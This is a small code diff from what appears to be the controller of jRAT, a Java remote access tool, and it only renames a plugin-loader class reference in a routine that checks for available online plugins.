@@ -5,7 +5,7 @@ import java.util.List;
 import jrat.api.RATPlugin;
 import se.jrat.controller.Main;
 import se.jrat.controller.addons.OnlinePlugin;
-import se.jrat.controller.addons.PluginLoader;
+import se.jrat.controller.addons.Plugins;
 
 public class RunnableCheckPlugins implements Runnable {
 
@@ -14,7 +14,7 @@ public class RunnableCheckPlugins implements Runnable {
 			List<OnlinePlugin> list = OnlinePlugin.getAvailablePlugins();
 			
 			for (OnlinePlugin oplugin : list) {
-				RATPlugin plugin = PluginLoader.getPlugin(oplugin.getName());
+				RATPlugin plugin = Plugins.getPlugin(oplugin.getName());
 				
 				
 				if (plugin != null) {
